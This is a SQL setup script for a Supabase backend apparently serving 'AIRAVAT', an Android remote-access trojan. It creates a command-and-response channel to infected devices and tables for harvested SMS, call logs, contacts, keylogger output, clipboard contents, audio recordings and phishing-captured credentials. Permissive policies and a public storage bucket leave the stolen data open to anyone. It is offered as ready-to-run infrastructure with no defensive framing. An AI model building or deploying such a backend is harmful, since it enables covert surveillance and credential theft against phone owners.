-- AIRAVAT Supabase Database Schema
-- Execute these SQL commands in your Supabase SQL editor

-- Enable RLS (Row Level Security) for all tables
-- This is required for real-time subscriptions

-- 1. Online Devices Table
CREATE TABLE IF NOT EXISTS public.online_devices (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT UNIQUE NOT NULL,
  device_model TEXT,
  android_version TEXT,
  battery_level TEXT,
  is_rooted TEXT,
  ip_address TEXT,
  last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 2. Device Commands Table
CREATE TABLE IF NOT EXISTS public.device_commands (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  command_type TEXT NOT NULL,
  command_value TEXT,
  command_var TEXT,
  random_id TEXT,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  executed_at TIMESTAMP WITH TIME ZONE,
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 3. Device Responses Table
CREATE TABLE IF NOT EXISTS public.device_responses (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  command_id BIGINT,
  response_data TEXT,
  value1 TEXT,
  value2 TEXT,
  value3 TEXT,
  var2 TEXT,
  response_type TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE,
  FOREIGN KEY (command_id) REFERENCES public.device_commands(id) ON DELETE CASCADE
);

-- 4. File Storage Table
CREATE TABLE IF NOT EXISTS public.device_files (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  file_path TEXT NOT NULL,
  file_name TEXT NOT NULL,
  file_size BIGINT,
  file_type TEXT,
  storage_url TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 5. SMS Messages Table
CREATE TABLE IF NOT EXISTS public.device_sms (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  phone_number TEXT,
  message_content TEXT,
  message_type TEXT, -- 'sent', 'received', 'inbox', 'outbox'
  timestamp_sms TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 6. Call Logs Table
CREATE TABLE IF NOT EXISTS public.device_call_logs (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  phone_number TEXT,
  contact_name TEXT,
  call_type TEXT, -- 'incoming', 'outgoing', 'missed'
  call_duration INTEGER,
  call_timestamp TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 7. Contacts Table
CREATE TABLE IF NOT EXISTS public.device_contacts (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  contact_name TEXT,
  phone_number TEXT,
  email TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 8. Installed Apps Table
CREATE TABLE IF NOT EXISTS public.device_apps (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  app_name TEXT,
  package_name TEXT,
  version_name TEXT,
  version_code TEXT,
  is_system_app BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 9. Notifications Table
CREATE TABLE IF NOT EXISTS public.device_notifications (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  app_name TEXT,
  notification_title TEXT,
  notification_text TEXT,
  notification_timestamp TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 10. Keylogger Data Table
CREATE TABLE IF NOT EXISTS public.device_keylogger (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  app_name TEXT,
  keylog_data TEXT,
  timestamp_keylog TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 11. Clipboard Data Table
CREATE TABLE IF NOT EXISTS public.device_clipboard (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  clipboard_content TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 12. Audio Recordings Table
CREATE TABLE IF NOT EXISTS public.device_recordings (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  recording_name TEXT,
  recording_duration INTEGER,
  storage_url TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- 13. Phishing Data Table
CREATE TABLE IF NOT EXISTS public.device_phishing (
  id BIGSERIAL PRIMARY KEY,
  device_id TEXT NOT NULL,
  phishing_type TEXT,
  target_app TEXT,
  captured_data TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  FOREIGN KEY (device_id) REFERENCES public.online_devices(device_id) ON DELETE CASCADE
);

-- Add indexes for better performance
CREATE INDEX IF NOT EXISTS idx_online_devices_device_id ON public.online_devices(device_id);
CREATE INDEX IF NOT EXISTS idx_device_commands_device_id ON public.device_commands(device_id);
CREATE INDEX IF NOT EXISTS idx_device_commands_status ON public.device_commands(status);
CREATE INDEX IF NOT EXISTS idx_device_responses_device_id ON public.device_responses(device_id);
CREATE INDEX IF NOT EXISTS idx_device_responses_command_id ON public.device_responses(command_id);

-- Add updated_at trigger for online_devices
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_online_devices_updated_at
  BEFORE UPDATE ON public.online_devices
  FOR EACH ROW
  EXECUTE FUNCTION update_updated_at_column();

-- Enable Row Level Security (RLS) for real-time subscriptions
ALTER TABLE public.online_devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_responses ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_files ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_sms ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_call_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_apps ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_notifications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_keylogger ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_clipboard ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_phishing ENABLE ROW LEVEL SECURITY;

-- Create permissive policies for authenticated users (you may want to restrict this based on your security requirements)
CREATE POLICY "Allow all operations for authenticated users" ON public.online_devices
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_commands
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_responses
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_files
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_sms
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_call_logs
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_contacts
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_apps
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_notifications
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_keylogger
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_clipboard
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_recordings
  FOR ALL USING (true);

CREATE POLICY "Allow all operations for authenticated users" ON public.device_phishing
  FOR ALL USING (true);

-- Create storage bucket for file uploads
INSERT INTO storage.buckets (id, name, public) VALUES ('device-files', 'device-files', true);

-- Create storage policy for device files
CREATE POLICY "Allow public uploads" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'device-files');

CREATE POLICY "Allow public downloads" ON storage.objects
  FOR SELECT USING (bucket_id = 'device-files');

CREATE POLICY "Allow public updates" ON storage.objects
  FOR UPDATE USING (bucket_id = 'device-files');

CREATE POLICY "Allow public deletes" ON storage.objects
  FOR DELETE USING (bucket_id = 'device-files');
